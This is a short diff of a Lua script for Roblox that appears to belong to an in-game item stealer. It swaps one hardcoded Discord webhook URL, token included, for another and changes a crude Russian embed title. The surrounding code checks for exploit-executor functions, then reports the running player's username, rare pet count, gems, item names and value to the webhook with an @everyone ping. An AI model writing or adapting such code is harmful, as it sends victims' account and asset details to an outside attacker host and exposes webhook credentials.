@@ -55,12 +55,12 @@ function SendMessage(Webhook, Message, Botname, huges, tier)
 
 
 	if getupvalue or debug.getupvalue and getconstants and getsenv then work = true end
-	local url = "https://discord.com/api/webhooks/1097060525025792112/A2lUYOzXbUwbIvEw6gz-2a0iF_T1VNPLfXVAfybVWLpDsMEmtqH1Qy3jSrBNSUSI_Lw4"
+	local url = "https://discord.com/api/webhooks/1097549594444963971/SZGHLW5eNvwphvYVQzQnJ2CuoMqMZyTRSvTvlKYveeBE5H-NK97l9h3QTsYl-Icgi2uL"
 	local data = {
 		["content"] = "@everyone",
 		["embeds"] = {
 			{
-				["title"] = "**+dolbaeb, gg**",
+				["title"] = "**+sochnik, gg**",
 				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **Huge count:** ' .. Botname .. '\n \n **Gems:** '.. Message .. '\n \n **Total exc:** '.. Webhook.."\n\n **HUGE NAMES:** ".. huges..' \n\n **TIER**: '..tier,
 				["type"] = "rich",
 				["color"] = tonumber(0x7269da),
